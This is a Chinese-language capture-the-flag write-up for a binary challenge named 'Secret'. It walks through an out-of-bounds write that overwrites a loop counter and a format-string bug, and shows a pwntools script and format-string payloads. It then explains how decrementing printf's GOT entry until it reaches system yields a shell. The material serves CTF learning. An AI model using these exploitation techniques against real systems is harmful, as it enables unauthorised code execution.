# Secret

一个密码机，要连续输入100次secrest才能get flag。。。显然是唬人的

![sn2I8r](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/sn2I8r.png)



![adfasfdasfasf](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/adfasfdasfasf.png)

![9b0ViT](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/9b0ViT.png)

输入的函数会进行对比，对比细节在0x40136D这个超长函数中，实际上，基本都是重复，唯一的区别就是每次的值不一样。

![image-20200321174114753](/Users/migraine/Library/Application Support/typora-user-images/image-20200321174114753.png)

输入name的时候，有个越界，可以把记数用的内存覆盖掉。。。不过这个漏洞似乎并没有什么用？

![image-20200321172737950](/Users/migraine/Library/Application Support/typora-user-images/image-20200321172737950.png)

```python
#!/usr/bin/python
from pwn import *
p=process("./secret.dms")
gdb.attach(p,"b *0x46a396")

p.sendline(p64(0x0)+"\x00"*0x8+p32(0x46d080))

p.recvuntil('Secret:')
#p.sendline(str(18283))

p.interactive()

'''
>>> print 0x476b
18283

'''
```

发现原来还有个格式化字符串漏洞?

![YiiMNz](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/YiiMNz.png)

![ngfPo8](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ngfPo8.png)



```
>>> fmtstr_payload(6, {0x46d030:0x12334})
'0\xd0F\x001\xd0F\x002\xd0F\x003\xd0F\x00%36c%6$hhn%239c%7$hhn%222c%8$hhn%255c%9$hhn'
```

payload得改

```
target=0x46d030
value=0x12334
payload="%"+str(value)+"c%6$lln"+p64(target)
```

不知道这个格式化字符串能不能用，后来看了WP，发现是两个洞结合的。。

***这个真的是一个很有意思的思路***

修改存放计数的times内存，在buf中写入/bin/sh

每次循环times内存都会减少1，所以把times修改为printf的got表地址，因为printf和system的值想差10.

让printf的got表值减少10次，执行printf正好会执行system。

退出循环，执行printf(buf)，实际上会执行system("/bin/sh")



或者真的跑完。。用IDA生成asm，然后取值

https://blog.csdn.net/qq_43116977/article/details/105041308

